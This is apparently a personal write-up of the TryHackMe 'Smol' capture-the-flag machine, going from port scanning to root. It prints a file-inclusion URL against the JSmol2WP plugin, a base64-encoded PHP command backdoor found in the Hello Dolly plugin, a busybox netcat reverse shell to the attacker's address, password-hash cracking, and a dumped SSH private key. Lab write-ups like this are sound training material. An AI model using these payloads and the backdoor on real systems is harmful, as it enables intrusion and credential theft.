# Smol

---

Platform: Tryahackme

Difficulty: Medium

Date: 01/07/2025

Status: Rooted

---

Nmap scan:

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.93.97 -oN nmap.full
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 09:33 EDT
Nmap scan report for smol.thm (10.10.93.97)
Host is up (0.21s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://www.smol.thm/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: Open ssh (newer version, no need to search for exploits)
- Port 80: http Apache httpd 2.4.41 ((Ubuntu)) redirected to [http://www.smol.thm/](http://www.smol.thm/) , so we have to add that to our /etc/hosts file.

Port 80:

![img.png](img.png)

It was just like a ctf information type page hosted. Things to note from here:

- Made with wordpress cms.
- admin email : admin@smol.thm

Let’s enumerate wordpress:

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ wpscan --url http://www.smol.thm/ -e ap, vt --force --api-token REDACTED
[+] URL: http://www.smol.thm/ [10.10.172.153]
.....
[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

It had jsmol2wp plugin installed, which was vulnerable, so i googled about it and found it was CVE-2018-20463 WordPress JSmol2WP <=1.07 - Local File Inclusion.

Description: |
WordPress JSmol2WP plugin 1.07 is susceptible to local file inclusion via ../ directory traversal in query=php://filter/resource= in the jsmol.php query string. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site. This can also be exploited for server-side request forgery.

[https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-20463.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2018/CVE-2018-20463.yaml)

```bash
{{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

# We just have to put our base url ahead of it and it will show wp-config.php page to us.

[http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php](http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php)
```

![img_1.png](img_1.png)

Username found: wpuser

Password found: kbLSF2Vop#lw3rjDZ629*Z%G

Now, we can log in to /wp-login.php and enumerate it further for initial access.

---

After logging in to wordpress, we can see in pages page, there was a private page named “Webmaster tasks!!” which was looks like some assingned to someone, but here we got something for us.

![img_2.png](img_2.png)

![img_3.png](img_3.png)

Look at task 1: [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.

That means, there was one more plugin name “hello dolly” which was installed, let’s google it:

The Hello Dolly WordPress plugin is a simple plugin designed **to display random lyrics from the song "Hello, Dolly!"** **in the WordPress admin interface**. It’s source code was stored in a file named hello.php , so we can look at that file via same local file inclusion vulnerability we found.

```bash
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```

```bash
<?php
/**
 * @package Hello_Dolly
 * @version 1.7.2
 */
/*
Plugin Name: Hello Dolly
Plugin URI: http://wordpress.org/plugins/hello-dolly/
......

// This just echoes the chosen line, we'll position it later.
function hello_dolly() {
	eval(base64_decode('CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA='));
```

I tried to decode that base64 encoded string:

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

I didn’t understand what this line of code does, so used chatgpt to decode that hex values and results made me happy:

- **Full Code Simplified:**
    
    ```php
    if (isset($_GET["cmd"])) {
        system($_GET["cmd"]);
    }
    ```
    
- **What It Does:**
    - It checks if there is a `GET` parameter named `cmd` in the URL.
    - If it exists, it **executes the value** of that parameter as a **system command** on the server.
    - This is done using `system()`, which executes an external program and displays the output.

Let’s check that in [http://www.smol.thm/wp-admin/index.php](http://www.smol.thm/wp-admin/index.php) page, if it works:

![img_4.png](img_4.png)

We got remote code execution!

Let’s get a reverse shell back to our kali machine.

```bash
busybox nc 10.17.87.131 4445 -e /bin/sh 
# used this reverse shell from revshells.com
# Note : It it not works, try to url encode and then upload it.
Url = http://www.smol.thm/wp-admin/index.php?cmd=busybox%20nc%2010.17.87.131%204445%20-e%20%2Fbin%2Fsh
```

![img_5.png](img_5.png)

let’s upgrade our shell via python tty:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@smol:/var/www/wordpress/wp-admin$ cd /home
cd /home
www-data@smol:/home$ ls
ls
diego  gege  think  xavi
```

we had 4 users in this machine: 

- diego
- gege
- think
- xavi

---

### Shell as diego:

As we had a database user’s password, let’s enumerate database:

```bash
www-data@smol:/home$ mysql -u wpuser -p
mysql -u wpuser -p
Enter password: kbLSF2Vop#lw3rjDZ629*Z%G

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 141
.... 
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| wordpress          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use wordpress
....
mysql> select user_login,user_pass from wp_users;
select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
6 rows in set (0.00 sec)

```

We had password hashed for all the accounts registered in that machine, so let’s try to crack them:

first of all , store those hashed in a .txt file.

And we will be using john the ripper to crack those hashes with rockyou.txt wordlist.

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ cat hashes.txt  
admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1

┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt  
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
....

┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ john  hashes.txt --show
diego:sandiegocalifornia
```

We were able to crack just 1 password of user diego, lets use that password to switch to user diego, note that this password will not work with ssh login to user diego.

```bash
www-data@smol:/var/www/wordpress/wp-admin$ su diego
su diego
Password: sandiegocalifornia

diego@smol:/var/www/wordpress/wp-admin$ id
id
uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
diego@smol:/home/diego$ cat user.txt
45edaec653f......REDACTED
```

---

### Shell as think:

As user diego was in an group called internal, so we now had read permission to read other user’s directory, so let’s see think’s home directory:

```bash
diego@smol:/home$ ls -la /home/think
ls -la /home/think
total 32
drwxr-x--- 5 think internal 4096 Jan 12  2024 .
drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
drwx------ 2 think think    4096 Jan 12  2024 .cache
drwx------ 3 think think    4096 Aug 18  2023 .gnupg
-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
```

We can read think’s id_rsa from .ssh directory , so let’s read and save that to our kali machine and ssh to user think:

```bash
diego@smol:/home/think/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Save that file content in our kali machine with a file named “id_rsa” and give ti permission chmod 600.

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ chmod 600 id_rsa
```

Now, ssh to user think:

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ ssh -i id_rsa think@10.10.252.187
....
think@smol:~$ id
uid=1000(think) gid=1000(think) groups=1000(think),1004(dev),1005(internal)
```

---

### Shell as gege:

Searched user gege’s home directory and there was a file stored named wordpress.old.zip, maybe backup file of old wordpress they used in that machine. But only user gege can read it. So we tried to switch to user gege directly and it worked!, because there was  misconfiguration in  **PAM** configuration file for `su` located at `/etc/pam.d/su`

```bash
think@smol:/home/gege$ ls -la
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
think@smol:/home/gege$ su gege
gege@smol:~$ id
uid=1003(gege) gid=1003(gege) groups=1003(gege),1004(dev),1005(internal)
```

---

### Shell as xavi:

Now let’s try to get that zip file to our kali machine and will try to unzip it:

```bash
gege@smol:~$ python3 -m http.server 9001
Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...

# Our kali machine
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ wget http://10.10.252.187:9001/wordpress.old.zip
```

Let’s try to unzip that file:

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ unzip wordpress.old.zip
Archive:  wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password:
```

That file was password protected, let’s try to grab hash with zip2john and then crack that hash with john.

```bash
┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ zip2john wordpress.old.zip > zip_hash.txt

┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt

┌──(kali㉿kali)-[~/tryhackme/smol]
└─$ john zip_hash.txt --show                                     
wordpress.old.zip:hero_gege@hotmail.com::wordpress.old.zip:wordpress.old/wp-content/plugins/akismet/index.php, wordpress.old/wp-content/index.php, wordpress.old/wp-content/plugins/index.php, wordpress.old/wp-content/themes/index.php, wordpress.old/wp-includes/blocks/spacer/style.min.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.min.css, wordpress.old/wp-includes/blocks/spacer/style.css, wordpress.old/wp-includes/blocks/spacer/style-rtl.css:wordpress.old.zip

1 password hash cracked, 0 left
```

password: hero_gege@hotmail.com

Unzip that file. And while looking that folder , that looks like exact wordpress backup, so let’s see the juiciest file in that folder “wp-config.php”

```bash
┌──(kali㉿kali)-[~/tryhackme/smol/wordpress.old]
└─$ cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
....
/** Database username */
define( 'DB_USER', 'xavi' );

/** Database password */
define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
```

We got xavi user’s password too, now let’s switch to user xavi:

```bash
gege@smol:~$ su xavi
Password: 
xavi@smol:/home/gege$ id
uid=1001(xavi) gid=1001(xavi) groups=1001(xavi),1005(internal)
```

---

### Shell as root:

We can check user xavi’s sudo permissions:

```bash
xavi@smol:/home/gege$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL
```

Xavi can run any command with sudo privileges, so let’s just switch to super user “root”

```bash
xavi@smol:/home/gege$ sudo su
root@smol:/home/gege$ cd /root
root@smol:~$ ls
root.txt snap
root@smol:~$ cat root.txt
bf89ea3ea0.....REDACTED
```

That’s it ! We are root now!!!!